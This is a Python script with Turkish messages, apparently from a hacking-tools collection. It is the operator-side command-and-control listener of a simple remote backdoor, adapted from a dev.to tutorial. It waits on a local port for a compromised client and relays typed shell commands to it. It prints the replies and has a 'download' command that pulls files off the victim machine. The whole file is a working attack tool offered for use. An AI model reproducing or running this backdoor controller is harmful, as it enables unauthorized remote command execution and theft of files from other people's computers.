#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import socket
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

LHOST = "127.0.0.1"
LPORT = 2222

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
sock.listen(1)
print(f"Bağlantılar Dinleniyor >> {LHOST}:{LPORT} ...")
client, addr = sock.accept()

while True:
    input_header = client.recv(1024)
    command = input(input_header.decode()).encode()

    if command.decode("utf-8").split(" ")[0] == "download":
        file_name = command.decode("utf-8").split(" ")[1][::-1]
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                f.write(read_data)
                read_data = client.recv(1024)
                if read_data == b"DONE":
                    break

    if command == b"":
        print("Lütfen bir komut girin")
    else:
        client.send(command)
        data = client.recv(1024).decode("utf-8")
        if data == "exit":
            print("Bağlantı sonlandırılıyor", addr[0])
            break
        print(data)
client.close()
sock.close()

#https://dev.to/tman540/simple-remote-backdoor-with-python-33a0